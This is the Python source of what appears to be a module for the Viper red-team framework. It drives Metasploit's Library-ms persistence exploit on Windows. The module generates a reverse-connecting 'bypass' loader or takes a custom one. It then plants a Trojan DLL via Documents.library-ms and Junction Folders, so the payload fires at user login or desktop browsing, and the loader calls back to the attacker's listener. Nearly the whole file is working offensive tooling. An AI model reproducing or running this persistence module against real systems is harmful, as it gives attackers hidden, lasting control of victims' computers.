# -*- coding: utf-8 -*-
# @File  : PostMulitMsfBypassUAC.py
# @Date  : 2019/3/15
# @Desc  :

from Lib.ModuleAPI import *


class PostModule(PostMSFRawModule):
    NAME_ZH = "Windows Library-ms持久化"
    DESC_ZH = "木马dll文件写入到Documents.library-ms配置文件中并新建Junction Folders\n" \
              "当用户登录或浏览桌面时生效.\n" \
              "使用模块时请勿关闭对应监听,Loader启动需要回连监听获取核心库文件."

    NAME_EN = "Windows Library-ms persistence"
    DESC_EN = "Write the Trojan dll file into the Documents.library-ms configuration file and create a new Junction Folders\n" \
              "It takes effect when the user logs in or browses the desktop.\n" \
              "When using the module, do not turn off the corresponding handler, the Loader needs to be connected back to the monitoring to obtain the core library files."

    MODULETYPE = TAG2TYPE.Persistence
    PLATFORM = ["Windows"]  # 平台
    PERMISSIONS = ["User", "Administrator", "SYSTEM", ]  # 所需权限
    ATTCK = [""]  # ATTCK向量
    README = ["https://www.yuque.com/vipersec/module/rqqo3g"]
    REFERENCES = ["https://blog.f-secure.com/abusing-windows-library-files-for-persistence/"]
    AUTHOR = ["Viper"]

    REQUIRE_SESSION = True
    OPTIONS = register_options([
        OptionHander(),
        OptionFileEnum(ext=['exe'], required=False),
        OptionCacheHanderConfig(),
    ])

    def __init__(self, sessionid, ipaddress, custom_param):
        super().__init__(sessionid, ipaddress, custom_param)
        self.type = "exploit"
        self.mname = "windows/local/persistence_library_ms"

    def check(self):
        """执行前的检查函数"""

        session = Session(self._sessionid)
        if session.is_windows:
            pass
        else:
            return False, "此模块只支持Windows的Meterpreter", "This module only supports Meterpreter for Windows"

        if 'windows' not in self.get_handler_payload().lower():
            return False, "选择handler错误,请选择windows平台的监听", "Select the handler error, please select the handler of the windows platform"
        self.set_payload_by_handler()

        filepath = self.get_fileoption_filepath()
        if filepath is None:  # 根据监听进行持久化
            exe_filepath = self.generate_bypass_exe_file(template="REVERSE_HEX_BASE")
        else:
            Notice.send_info("使用自定义的loader进行持久化", "Use custom loader for persistence")
            exe_filepath = filepath

        self.set_msf_option("EXE::Custom", exe_filepath)
        return True, None

    def callback(self, status, message, data):
        # 调用父类函数存储结果(必须调用)
        if status:
            self.log_info("模块执行完成", "Module operation completed")
            self.log_good(f"DLL路径: {data}", f"DLL path: {data}")
            self.log_good(f"用户下次登录时或浏览桌面时生效", "Take effect the next time the user login or browses the desktop")
            self.cache_handler()
        else:
            self.log_error("模块执行失败", "Module execution failed")
            self.log_error(message, message)
